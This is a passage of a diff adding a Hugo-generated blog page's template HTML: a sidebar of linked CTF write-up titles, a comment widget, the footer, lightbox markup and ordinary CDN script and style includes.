+    <a href="/p/ctfshow-%E6%96%B0%E6%89%8B%E6%9D%AF-web/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ctfshow-新手杯-web</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ctfshow-%E5%B9%B4ctf-web/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ctfshow-年CTF-web</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF-web/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ctfshow-愚人杯-web</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">信息收集</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="Relish1one/blog_data"
+        issue-term="pathname"
+        
+        label="none"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2022 - 
+        
+        2023 R1one&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<script
+    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js"
+    integrity="sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe"
+    crossorigin="anonymous"
+    size="300"
+    alpha="0.6"
+    zindex="-1"
+    defer
+></script>
+
+<script
+    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/nprogress.min.js"
+    integrity="sha384-bHDlAEUFxsRI7JfULv3DTpL2IXbbgn4JHQJibgo5iiXSK6Iu8muwqHANhun74Cqg"
+    crossorigin="anonymous"
+></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/css/nprogress.css"
+    integrity="sha384-KJyhr2syt5+4M9Pz5dipCvTrtvOmLk/olWVdfhAp858UCa64Ia5GFpTN7+G4BWpE"
+    crossorigin="anonymous"
+/>
+<script>
+    NProgress.start();
+    document.addEventListener("readystatechange", () => {
+        if (document.readyState === "interactive") NProgress.inc(0.8);
+        if (document.readyState === "complete") NProgress.done();
+    });
+</script>
+
+    </body>
+</html>
